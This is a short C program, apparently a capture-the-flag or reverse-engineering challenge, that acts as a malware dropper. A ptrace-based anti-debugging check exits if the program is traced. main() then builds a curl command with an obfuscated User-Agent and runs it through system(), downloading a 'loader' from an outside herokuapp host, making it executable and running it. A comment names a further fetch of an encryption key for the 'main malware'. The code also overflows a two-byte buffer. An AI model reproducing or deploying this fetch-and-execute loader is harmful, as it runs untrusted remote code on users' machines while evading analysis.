#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>

int AntiDebug(){
	int getpid = 0;
	getpid = getppid();
if (ptrace(PTRACE_TRACEME, getpid, 1, 0) == -1) 
    {
	if(getpid == 0){
		getpid = getppid();
	}
        printf("[+] Debugger Detected: you cant bypass me\n");
	exit(0);
    }

}

void main(){
AntiDebug();
int a=3529, b;

asm ("movl %1, %%eax;" 
      "movl %%eax, %0;"
     :"=r"(b)        /* output */
     :"r"(a)         /* input */
     :"%eax"         /* clobbered register */
     );

char val[2];
char one[70] = "curl -H 'User-Agent:";
char two[200] = "' https://th1s-is-4-f4ke-fl4g.herokuapp.com/load -o loader; chmod +x loader; ./loader";
sprintf(val, "0x%x", b);
strcat(one, val);
strcat(one, two);
//AntiDebug();
system(one);

// curl & exec main malware below "curl -H 'User-Agent:0xdc9' https://th1s-is-4-f4ke-fl4g.herokuapp.com/enckey"


}

